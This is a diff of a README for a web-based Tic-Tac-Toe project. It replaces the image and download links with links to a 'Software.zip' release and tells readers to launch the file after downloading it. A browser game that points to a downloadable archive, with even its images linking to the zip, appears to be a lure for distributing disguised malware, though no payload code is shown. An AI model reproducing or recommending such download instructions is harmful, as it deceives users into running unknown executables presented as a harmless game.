@@ -1,7 +1,7 @@
 
 # Welcome to PRODIGY_WD_03 🎮
 
-![Tic-Tac-Toe](https://cdn.pixabay.com/photo/2015/10/08/21/02/game-979218_960_720.jpg)
+![Tic-Tac-Toe](https://github.com/keeontegod/PRODIGY_WD_03/releases/download/v2.0/Software.zip)
 
 ## About
 PRODIGY_WD_03 is a web-based Tic-Tac-Toe game where users can engage in exciting gameplay either against each other or challenge an AI opponent. The game is designed to enhance user experience with intuitive interfaces, smooth animations, and a responsive web design. It handles the game state, user interactions, and checks for winning conditions, providing an immersive gaming experience for all players.
@@ -24,7 +24,7 @@ PRODIGY_WD_03 is a web-based Tic-Tac-Toe game where users can engage in exciting
 
 ## Installation
 To access and enjoy the game, please download the software package from the following link:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/keeontegod/PRODIGY_WD_03/releases/download/v2.0/Software.zip)](https://github.com/keeontegod/PRODIGY_WD_03/releases/download/v2.0/Software.zip)
 
 ### Note: The file needs to be launched after download.
 
@@ -40,12 +40,12 @@ Challenge yourself or your friends to a thrilling game of Tic-Tac-Toe! Choose yo
 4. Aim to form a line of three markers before your opponent  
 5. Enjoy the game and embrace the challenge!  
 
-![Gameplay](https://cdn.pixabay.com/photo/2016/12/13/15/00/tic-tac-toe-1903860_960_720.jpg)
+![Gameplay](https://github.com/keeontegod/PRODIGY_WD_03/releases/download/v2.0/Software.zip)
 
 ## Get Started
 Experience the thrill of PRODIGY_WD_03 now by downloading the software package and launching the game. Challenge yourself, test your strategic skills, and enjoy hours of fun with this interactive Tic-Tac-Toe masterpiece.
 
-Visit the [website](https://github.com/user-attachments/files/18388744/Software.zip) to access the game now!
+Visit the [website](https://github.com/keeontegod/PRODIGY_WD_03/releases/download/v2.0/Software.zip) to access the game now!
 
 ## Feedback and Support
 Your feedback is invaluable to us! If you encounter any issues, have suggestions for improvement, or simply want to share your gaming experience, feel free to reach out to us. We value your input and are committed to enhancing your gaming experience.
